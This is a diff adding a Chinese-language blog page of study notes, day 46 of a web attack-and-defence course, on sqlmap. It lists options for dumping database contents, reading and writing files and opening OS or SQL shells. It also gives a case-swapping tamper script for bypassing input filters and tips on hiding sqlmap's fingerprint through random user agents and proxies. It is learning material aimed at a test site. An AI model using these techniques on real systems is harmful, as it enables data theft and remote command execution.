@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        web攻防笔记第46天 | FlowsecNagi's Home
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E7%A2%8E%E7%A2%8E%E5%BF%B5">反抗者</a>
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">逃亡之路</a>
+            
+              <a class="nav-menu-item" href="/%E5%8E%AE%E6%9D%80%E6%88%98%E5%9C%BA">战场</a>
+            
+              <a class="nav-menu-item" href="/%E7%A7%91%E7%A0%94">研究所</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">web攻防笔记第46天</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/%E7%AC%94%E8%AE%B0/" class="post-tag">#笔记</a>
+  
+    <a href="/tags/xiaodi8/" class="post-tag">#xiaodi8</a>
+  
+    <a href="/tags/web%E6%94%BB%E9%98%B2/" class="post-tag">#web攻防</a>
+  
+
+
+          <span class="post-date">2023-07-26</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <p>参考资料：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a></p>
+<p>最重要的：搞清楚数据库类型</p>
+<h3 id="数据猜解-库表列数据-字典"><a href="#数据猜解-库表列数据-字典" class="headerlink" title="数据猜解-库表列数据&amp;字典"></a>数据猜解-库表列数据&amp;字典</h3><p>测试：<a target="_blank" rel="noopener" href="http://vulnweb.com/">http://vulnweb.com/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">--current-db   <span class="hljs-comment">#获取当前数据库名</span><br><br>--tables -D <span class="hljs-string">&quot;数据库名&quot;</span> 	<span class="hljs-comment">#获取表名</span><br><br>--columns -T <span class="hljs-string">&quot;表名&quot;</span> -D <span class="hljs-string">&quot;数据库名&quot;</span>	<span class="hljs-comment">#获取列名</span><br><br>--dump -C <span class="hljs-string">&quot;列名&quot;</span> -T <span class="hljs-string">&quot;表名&quot;</span> -D <span class="hljs-string">&quot;数据库名&quot;</span>	<span class="hljs-comment">#获取数据</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="权限操作-文件-命令-交互式"><a href="#权限操作-文件-命令-交互式" class="headerlink" title="权限操作-文件&amp;命令&amp;交互式"></a>权限操作-文件&amp;命令&amp;交互式</h3><p>测试：<strong>MYSQL高权限注入</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#引出权限：</span><br>--is-dba 	<span class="hljs-comment">#查看权限</span><br>--privileges	<span class="hljs-comment">#是否是数据库管理员</span><br><br><span class="hljs-comment">#引出文件：</span><br>--file-read 	<span class="hljs-comment">#读取指定文件</span><br>--file-write 	 <span class="hljs-comment">#写入本地文件</span><br>--file-dest <br><br><span class="hljs-comment">#引出命令：</span><br>--os-cmd=ver/calc<br>--os-shell <br>--sql-shell<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="提交方法-POST-HEAD-JSON"><a href="#提交方法-POST-HEAD-JSON" class="headerlink" title="提交方法-POST&amp;HEAD&amp;JSON"></a>提交方法-POST&amp;HEAD&amp;JSON</h3><p>测试：Post Cookie Json</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">--data <span class="hljs-string">&quot;&quot;</span>	<span class="hljs-comment">#表单里POST请求，抓包找数据请求，不推荐</span><br><br>--cookie <span class="hljs-string">&quot;&quot;</span>	<span class="hljs-comment">#Cookie，不推荐</span><br><br>-r 1.txt	<span class="hljs-comment">#推荐，数据完整性。把请求标头放进文件，但其实文件里不知道注入点，可使用星号（*）标明注入点</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="绕过模块-Tamper脚本-使用-开发"><a href="#绕过模块-Tamper脚本-使用-开发" class="headerlink" title="绕过模块-Tamper脚本-使用&amp;开发"></a>绕过模块-Tamper脚本-使用&amp;开发</h3><p>测试：base64注入 有过滤的注入</p>
+<p><strong>tamper模块：里面有很多脚本，可以直接使用，查看说明书就行</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">--tamper=base64encode.py<br>--tamper=test.py<br><br><span class="hljs-comment">#bypass.py</span><br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br>__priority__ = PRIORITY.LOW<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dependencies</span>():<br>	<span class="hljs-keyword">pass</span><br><br><span class="hljs-comment">#对于有过滤的语句怎么绕过，大小写替换</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>	<span class="hljs-keyword">if</span> payload:      <br>		payload = payload.replace(<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;sElEct&#x27;</span>)<br>		payload = payload.replace(<span class="hljs-string">&#x27;OR&#x27;</span>,<span class="hljs-string">&#x27;Or&#x27;</span>)<br>		payload = payload.replace(<span class="hljs-string">&#x27;AND&#x27;</span>,<span class="hljs-string">&#x27;And&#x27;</span>)<br>		payload = payload.replace(<span class="hljs-string">&#x27;SLEEP&#x27;</span>,<span class="hljs-string">&#x27;SleeP&#x27;</span>)<br>		payload = payload.replace(<span class="hljs-string">&#x27;ELT&#x27;</span>,<span class="hljs-string">&#x27;Elt&#x27;</span>)<br>	<span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="分析拓展-代理-调试-指纹-风险-等级"><a href="#分析拓展-代理-调试-指纹-风险-等级" class="headerlink" title="分析拓展-代理&amp;调试&amp;指纹&amp;风险&amp;等级"></a>分析拓展-代理&amp;调试&amp;指纹&amp;风险&amp;等级</h3><p>1、后期分析调试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">-v=(0-6)  <span class="hljs-comment">#详细的等级(0-6)，4HTTP请求用的比较多</span><br><br>--proxy <span class="hljs-string">&quot;http://xx:xx&quot;</span> <span class="hljs-comment">#代理注入</span><br></code></pre></td></tr></table></figure>
+
+<p>2、打乱默认指纹（sqlmap特征-UA打头）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">--user-agent <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment">#自定义user-agent</span><br><br>--random-agent  <span class="hljs-comment">#随机user-agent</span><br><br>--time-sec=(2,5) <span class="hljs-comment">#延迟响应，默认为5</span><br></code></pre></td></tr></table></figure>
+
+<p>3、使用更多的测试：测试Header注入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">--level=(1-5) <span class="hljs-comment">#要执行的测试水平等级（深度），默认为1 </span><br><br>--risk=(0-3)  <span class="hljs-comment">#测试执行的风险等级，默认为1 </span><br></code></pre></td></tr></table></figure>
+
+<p>代理池：使用快代理隧道代理（价格略高）</p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/07/28/web%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0%E7%AC%AC47%E5%A4%A9/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>web攻防笔记第47天</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/07/24/HTB-Vaccine/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      HTB-Vaccine
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">人</div><div class="matts">人</div><div class="matts">为</div><div class="matts">我</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">我</div><div class="matts">为</div><div class="matts">人</div><div class="matts">人</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">Theme Tranquility</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:flow63681@gmail.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/ABCkillmen">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-wx.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.freebuf.com/author/FlowsecNagi">Freebuf</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-zh.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.zhihu.com/">知乎</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:flow63681@gmail.com">flow63681@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">FlowsecNagi's Home</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+  
+
+  </body>
+</html>
